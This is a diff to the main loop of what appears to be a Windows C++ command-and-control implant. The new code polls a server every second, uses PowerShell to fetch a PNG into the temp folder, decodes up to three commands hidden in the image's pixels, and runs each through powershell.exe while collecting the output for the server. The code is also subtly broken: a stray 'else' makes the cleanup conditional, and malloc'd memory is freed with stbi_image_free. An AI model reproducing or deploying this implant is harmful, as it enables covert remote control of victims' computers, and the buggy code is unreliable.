@@ -380,10 +380,10 @@ int wmain() {
 
     // get responses to the server and constantly check in every minute for commands
     std::string response = "";
-    int int_imageNum = 0;
+    int int_imageNum = 1;
 
     while (true) {
-        Sleep(5000);
+        Sleep(1000);
         std::string c2_command = "";
         
         std::wstring imageNum = std::to_wstring(int_imageNum);
@@ -392,14 +392,100 @@ int wmain() {
         if (c2_command.length() != 0) {
             std::string command = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe /c ";
             command.append(c2_command);
+
+            char temp_path[MAX_PATH + 1];
+            DWORD bufferLen = MAX_PATH + 1;
+            GetTempPathA(bufferLen, temp_path);
+            printf("Temp Path: %s\n", temp_path);
+            std::string image_path = "\"";
+            image_path.append(temp_path);
+            image_path.append("POGGG.png").append("\"");
+            
+            command.append(image_path.c_str());
+            printf("Final command: %s\n", command.c_str());
+
             std::wstring command_temp(command.begin(), command.end());
             wchar_t* wCommand = (wchar_t*) command_temp.c_str();
 
             // std::wcout << wCommand << std::endl;
+            
+            // This is getting picture from server
+            execute_shell(wCommand);
 
-            response = execute_shell(wCommand);
-        }
-    }
+            // Initialize width, height, and channels for original image
+            int width, height, channels;
+            std::string img_path = temp_path;
+            img_path.append("POGGG.png");
+            unsigned char *img = stbi_load(img_path.c_str(), &width, &height, &channels, 0);
+            if (img == NULL)
+            {
+                printf("RIP for image loading");
+                return 0;
+            }
+            printf("Image loaded with width: %dpx, height: %dpx, and channels: %d\n", width, height, channels);
+
+            size_t img_size = width * height * channels;
+
+            // Allocate memory for altered png
+            int altered_img_channels = 3;
+            size_t altered_img_size = width * height * altered_img_channels;
+            unsigned char *altered_img = (unsigned char *)malloc(altered_img_size);
+            if (altered_img == NULL)
+            {
+                printf("RIP for memory allocation for altered img");
+                return 0;
+            }
+
+
+            int max_pixels = width * height;
+            std::cout << "Max Pixels: " << max_pixels << std::endl;
+
+            std::vector<std::string> messages{"", "", ""};
+            messages = decode_png(img, max_pixels, width, height, channels, img_size);
+
+            if (messages[0] != "")
+            {   
+                std::string command = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe /c ";
+                command.append(messages[0]);
+                std::wstring command_temp(command.begin(), command.end());
+                wchar_t* wCommand = (wchar_t*) command_temp.c_str();
+
+                response.append("Command 1 response: ");
+                response.append(execute_shell(wCommand));
+                response.append("\n\n");
+            }
+
+            if (messages[1] != "")
+            {
+                std::string command = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe /c ";
+                command.append(messages[1]);
+                std::wstring command_temp(command.begin(), command.end());
+                wchar_t* wCommand = (wchar_t*) command_temp.c_str();
+
+                response.append("Command 2 response: ");
+                response.append(execute_shell(wCommand));
+                response.append("\n\n");
+            }
+
+            if (messages[2] != "")
+            {
+                std::string command = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe /c ";
+                command.append(messages[2]);
+                std::wstring command_temp(command.begin(), command.end());
+                wchar_t* wCommand = (wchar_t*) command_temp.c_str();
+
+                response.append("Command 3 response: ");
+                response.append(execute_shell(wCommand));
+                response.append("\n\n");
+            }
+            else
+
+
+            //cleanup
+            stbi_image_free(altered_img);
+            stbi_image_free(img);
+                }
+            }
 
     return -1;
 }
